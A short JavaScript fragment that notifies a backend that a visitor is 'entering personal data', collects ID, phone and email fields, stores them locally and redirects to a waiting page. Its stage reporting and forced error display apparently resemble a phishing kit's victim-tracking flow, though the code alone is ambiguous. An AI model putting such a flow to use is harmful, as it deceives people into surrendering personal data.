fetch(`${API_URL}/view`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body:JSON.stringify({
        message: 'INGRESANDO DATOS PERSONALES'
    })
});

if(info.cel !== ''){
    document.querySelector('.error').classList.remove('d-none');
}

document.querySelector('#form-data').addEventListener('submit', (e) => {
    e.preventDefault();

    info.cc = document.querySelector('#cc').value;
    info.cel = document.querySelector('#cel').value;
    info.email = document.querySelector('#email').value;

    LS.setItem('info', JSON.stringify(info));

    window.location.href = 'waiting.html';
});